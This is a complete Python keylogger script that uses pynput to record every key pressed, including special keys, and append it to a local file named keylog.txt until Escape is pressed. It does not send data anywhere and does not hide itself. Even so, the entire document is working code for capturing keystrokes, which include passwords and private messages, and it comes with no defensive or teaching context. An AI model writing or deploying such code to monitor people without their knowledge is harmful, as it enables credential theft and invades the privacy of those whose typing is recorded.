
from pynput.keyboard import Key, Listener

# Define the log file name
log_file = "keylog.txt"


# Function to write the pressed key to the log file
def write_to_log(key):
    # Open the log file in append mode
    with open(log_file, 'a') as f:
        try:
            # Write the pressed key to the log file
            f.write(str(key.char))
        except AttributeError:
            # If a special key (e.g., Shift, Ctrl) is pressed, write its name instead
            f.write('[' + str(key) + ']')


# Function to handle key presses
def on_press(key):
    # Write the pressed key to the log file
    write_to_log(key)


# Function to handle key releases
def on_release(key):
    # If the Escape key is pressed, stop the keylogger
    if key == Key.esc:
        return False


# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Run the listener loop
    listener.join()